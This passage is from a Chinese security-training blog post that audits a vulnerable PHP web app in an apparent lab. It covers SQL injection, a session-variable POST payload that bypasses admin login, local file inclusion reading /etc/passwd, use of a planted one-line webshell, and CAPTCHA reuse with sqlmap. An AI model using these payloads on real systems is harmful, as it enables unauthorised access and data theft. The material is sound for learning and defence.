+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">global # 设置了一些全局</span><br><span class="line"><span class="meta">$</span><span class="bash">submit=<span class="variable">$_</span> POST[<span class="string">'submit'</span>];就是提交按钮</span></span><br><span class="line">把user传给了 fl_value 又把 fl_value 传给了 fl_html</span><br><span class="line"><span class="meta">$</span><span class="bash">code = <span class="variable">$_POST</span>[<span class="string">'code'</span>]; <span class="comment"># post['code']等于$code</span></span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715142406921.png" alt="image-20200715142406921"></p>
+<p>查看 fl_value 是在哪个目录下，回到html目录</p>
+<p>命令:<code>grep &quot;fl_value -R ./&quot;</code></p>
+<p>我们要找到function函数，可以看到前面显示的路径includes/fun.php</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715143239730.png" alt="image-20200715143239730"></p>
+<p>vim查看一下改文件</p>
+<p><code>vim includes/fun,php</code>复制fl_value，打开文件后直接粘贴，会在下方显示，不能在插入模式下粘贴。</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715143708652.png" alt="image-20200715143708652"></p>
+<p>搜索出以下内容</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">funtion过来一个fl_value值，将$str传进去，进行了一个匹配，有delete和outfile，如果有替换为空</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715144147152.png" alt="image-20200715144147152"></p>
+<p>在查看login.php文件</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">可以看到又调用了 cheack_login()函数 </span><br><span class="line"><span class="meta">#</span><span class="bash"> 判断从哪个页面进入的</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 判断用户名、密码是不是为空</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 判断验证码正不正确</span></span><br><span class="line">然后提交给了cheack_login()函数</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715144228855.png" alt="image-20200715144228855"></p>
+<p>查看一下cheack_login()函数在哪个路径下</p>
+<p>命令：<code>grep &quot;cheack_login&quot; -R ../</code></p>
+<p>可以看到还是正在include/fun.php文件下</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715144644012.png" alt="image-20200715144644012"></p>
+<p>复制cheack_login，打开fun.php，还是按照之前的方法进行黏贴</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715144833750.png" alt="image-20200715144833750"></p>
+<p>可以看到他直接吧.$user变量直接给拼接进去了，所以就会产生sql注入</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715145058441.png" alt="image-20200715145058441"></p>
+<h4 id="代码审计越权漏洞"><a href="#代码审计越权漏洞" class="headerlink" title="代码审计越权漏洞"></a>代码审计越权漏洞</h4><p>继续审计login.php</p>
+<p>判断login和admin不为空直接跳转到admin.php，这个时候就可以想到越权漏洞</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715145659286.png" alt="image-20200715145659286"></p>
+<p>进行测试，访问前台，使用hackbar的Post data复制粘贴上面红线</p>
+<p>_ SESSION[‘login_in’]&amp;&amp;_SESSION[‘admin’]不要$符，让login_in和admin都等于1，方括号中不要单引号.</p>
+<p>还要设置一下会话时间设置 </p>
+<p><code>_ SESSION[login_time]=999999999999</code></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_SESSION[login_in]=1&amp;_SESSION[admin]=1&amp;_SESSION[login_time]=999999999999</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715150514414.png" alt="image-20200715150514414"></p>
+<p>再次访问后台登录页面，这个时候就不需要密码直接进入后台了</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715150600196.png" alt="image-20200715150600196"></p>
+<h4 id="代码审计文件包含漏洞"><a href="#代码审计文件包含漏洞" class="headerlink" title="代码审计文件包含漏洞"></a>代码审计文件包含漏洞</h4><p>继续查看admin.php文件，可以看到这样一行命令</p>
+<p><code>$_GET[&#39;file]等于file，include($_GET[&#39;file&#39;]也等于file</code></p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715150917265.png" alt="image-20200715150917265"></p>
+<p>这样就存在文件包含漏洞，在页面url后面输入<code>?file=/etc/passwd</code></p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715151244021.png" alt="image-20200715151244021"></p>
+<p> 再查看一下php.ini看他是不是远程文件包含，使用find查看一下路径</p>
+<p><code>find / -name php.ini</code>找一下php.ini的位置</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715151515218.png" alt="image-20200715151515218"></p>
+<p>找到路径，使用vi打开该文件，是off，没有远程文件包含</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715152156668.png" alt="image-20200715152156668"></p>
+<h4 id="代码审计后台漏洞"><a href="#代码审计后台漏洞" class="headerlink" title="代码审计后台漏洞"></a>代码审计后台漏洞</h4><p>查看一下config.php文件，使用find搜索路径</p>
+<p><code>find / -name config.php</code></p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715152556277.png" alt="image-20200715152556277"></p>
+<p>cat 一下这个路径，可以看到在config这个文件里有一个一句话木马，我们来对他进行一个访问，看看能否执行</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715152629952.png" alt="image-20200715152629952"></p>
+<p>在url中传输一个d执行linux命令，然后在PSOT传入b执行ls查看当前路径下的内容</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715153011666.png" alt="image-20200715153011666"></p>
+<h4 id="逻辑漏洞之验证码不失效"><a href="#逻辑漏洞之验证码不失效" class="headerlink" title="逻辑漏洞之验证码不失效"></a>逻辑漏洞之验证码不失效</h4><p>页面是先验证验证码是否正确，在验证账号密码</p>
+<p>当验证码输入错误的时候</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715153553499.png" alt="image-20200715153553499"></p>
+<p>可以当验证码输入正确时返回输入密码不正确，4秒返回</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715153715522.png" alt="image-20200715153715522"></p>
+<p>在这4秒内自己后退返回，他的验证码是不变的，这样就可以再次使用这个验证码来进行验证，所以这里就可以使用bp来进行抓包，然后发送到Repeater模块进行测试，这个期间因为是抓包所以页面是不动的，这也就导致了验证码不刷新</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715153933440.png" alt="image-20200715153933440"></p>
+<p>因为我们之前测试知道了用户名处存在sql注入，在这里将用户名后面改为aaa*这里的 * 表示所有，然后选中所有，另存为txt文本使用sqlmap记性自动注入</p>
+<p><code>sqlmap -r 文件名 --dbs</code>这样就注入出来了</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715154320109.png" alt="image-20200715154320109"></p>
+
+      
+    </div>
+    
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2020/07/25/PCCTF/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">&lt;</strong>
+      <div class="article-nav-title">
+        
+          PCCTF
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2020/07/25/bugku/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">bugku</div>
+      <strong class="article-nav-caption">&gt;</strong>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+<div class="ds-share share" data-thread-key="神马培训" data-title="神马培训" data-url="https://zhanqiaozai.github.io/2020/07/25/%E7%A5%9E%E9%A9%AC%E5%9F%B9%E8%AE%AD/"  data-images="http://7xkj1z.com1.z0.glb.clouddn.com/head.jpg" data-content="神马培训">
+    <div class="ds-share-inline">
+      <ul  class="ds-share-icons-16">
+      	<li data-toggle="ds-share-icons-more"><a class="ds-more" href="javascript:void(0);">分享到：</a></li>
+        <li><a class="ds-weibo" href="javascript:void(0);" data-service="weibo">微博</a></li>
+        <li><a class="ds-qzone" href="javascript:void(0);" data-service="qzone">QQ空间</a></li>
+        <li><a class="ds-qqt" href="javascript:void(0);" data-service="qqt">腾讯微博</a></li>
+        <li><a class="ds-wechat" href="javascript:void(0);" data-service="wechat">微信</a></li>
+      </ul>
+      <div class="ds-share-icons-more">
+      </div>
+    </div>
+ </div>
+ 
+
+
+
+
+
+</div>
+      <footer id="footer">
+  <div class="outer">
+    <div id="footer-info">
+      <div class="footer-left">
+        &copy; 2020 zhanqiaozai
+      </div>
+        <div class="footer-right">
+          <a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/smackgg/hexo-theme-smackdown" target="_blank">Smackdown</a>
+        </div>
+    </div>
+  </div>
+</footer>
+    </div>
+    
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+
+
+<script>
+	var yiliaConfig = {
+		fancybox: true,
+		mathjax: true,
+		animate: true,
+		isHome: false,
+		isPost: true,
+		isArchive: false,
+		isTag: false,
+		isCategory: false,
+		open_in_new: false
+	}
+</script>
+
+<script src="/js/main.js"></script>
+
+
+
+
+<script type="text/x-mathjax-config">
+MathJax.Hub.Config({
+    tex2jax: {
+        inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+        processEscapes: true,
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+    }
+});
+
+MathJax.Hub.Queue(function() {
+    var all = MathJax.Hub.getAllJax(), i;
+    for(i=0; i < all.length; i += 1) {
+        all[i].SourceElement().parentNode.className += ' has-jax';                 
+    }       
+});
+</script>
+
+<script src="//cdn.bootcss.com/mathjax/2.7.0/MathJax.js"></script>
+
+
+  </div>
+</body>
+</html>
